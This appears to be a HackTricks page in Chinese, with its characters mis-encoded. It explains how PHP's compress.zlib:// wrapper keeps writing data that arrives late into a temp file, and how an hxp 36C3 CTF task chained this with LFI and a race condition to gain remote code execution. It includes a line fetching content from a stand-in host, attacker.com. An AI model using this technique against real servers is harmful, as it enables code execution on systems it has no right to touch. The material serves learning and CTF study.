<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>


## `compress.zlib://`å’Œ`PHP_STREAM_PREFER_STDIO`

ä½¿ç”¨åè®®`compress.zlib://`å’Œæ ‡å¿—`PHP_STREAM_PREFER_STDIO`æ‰“å¼€çš„æ–‡ä»¶å¯ä»¥ç»§ç»­å°†åç»­åˆ°è¾¾çš„æ•°æ®å†™å…¥åŒä¸€æ–‡ä»¶ã€‚

è¿™æ„å‘³ç€å¯ä»¥æ‰§è¡Œä»¥ä¸‹è°ƒç”¨ï¼š
```php
file_get_contents("compress.zlib://http://attacker.com/file")
```
å°†å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œè¯·æ±‚çš„URLä¸ºhttp://attacker.com/fileï¼Œç„¶åæœåŠ¡å™¨å¯èƒ½ä¼šä»¥æœ‰æ•ˆçš„HTTPå“åº”å›å¤è¯¥è¯·æ±‚ï¼Œå¹¶ä¿æŒè¿æ¥æ‰“å¼€ï¼Œéšåä¸€æ®µæ—¶é—´å‘é€é¢å¤–çš„æ•°æ®ï¼Œè¿™äº›æ•°æ®ä¹Ÿä¼šè¢«å†™å…¥æ–‡ä»¶ä¸­ã€‚

æ‚¨å¯ä»¥åœ¨php-srcä»£ç çš„main/streams/cast.céƒ¨åˆ†ä¸­çœ‹åˆ°è¿™äº›ä¿¡æ¯ã€‚
```c
/* Use a tmpfile and copy the old streams contents into it */

if (flags & PHP_STREAM_PREFER_STDIO) {
*newstream = php_stream_fopen_tmpfile();
} else {
*newstream = php_stream_temp_new();
}
```
## ç«äº‰æ¡ä»¶åˆ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRace Condition to RCEï¼‰

[**è¿™ä¸ªCTF**](https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer)æ˜¯é€šè¿‡ä½¿ç”¨ä¹‹å‰çš„æŠ€å·§è§£å†³çš„ã€‚

æ”»å‡»è€…å°†ä½¿**å—å®³è€…æœåŠ¡å™¨æ‰“å¼€ä¸€ä¸ªè¿æ¥ï¼Œä»æ”»å‡»è€…çš„æœåŠ¡å™¨ä¸Šè¯»å–ä¸€ä¸ªæ–‡ä»¶**ï¼Œä½¿ç”¨**`compress.zlib`**åè®®ã€‚

**åœ¨**è¿™ä¸ª**è¿æ¥**å­˜åœ¨çš„åŒæ—¶ï¼Œæ”»å‡»è€…å°†**æ³„éœ²åˆ›å»ºçš„ä¸´æ—¶æ–‡ä»¶çš„è·¯å¾„**ï¼ˆæœåŠ¡å™¨æ³„éœ²ï¼‰ã€‚

**åœ¨**è¿æ¥**ä»ç„¶æ‰“å¼€çš„æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å°†**åˆ©ç”¨LFIåŠ è½½ä»–æ§åˆ¶çš„ä¸´æ—¶æ–‡ä»¶**ã€‚

ç„¶è€Œï¼ŒWebæœåŠ¡å™¨ä¸­æœ‰ä¸€ä¸ªæ£€æŸ¥ï¼Œ**é˜²æ­¢åŠ è½½åŒ…å«`<?`çš„æ–‡ä»¶**ã€‚å› æ­¤ï¼Œæ”»å‡»è€…å°†æ»¥ç”¨**ç«äº‰æ¡ä»¶**ã€‚åœ¨ä»ç„¶æ‰“å¼€çš„è¿æ¥ä¸­ï¼Œ**æ”»å‡»è€…**å°†åœ¨**WebæœåŠ¡å™¨**æ£€æŸ¥æ–‡ä»¶æ˜¯å¦åŒ…å«ç¦æ­¢å­—ç¬¦ä¹‹åï¼Œ**ä½†åœ¨åŠ è½½å…¶å†…å®¹ä¹‹å‰**ï¼Œ**å‘é€PHPæœ‰æ•ˆè½½è·**ã€‚

æœ‰å…³ç«äº‰æ¡ä»¶å’ŒCTFçš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹[https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer](https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
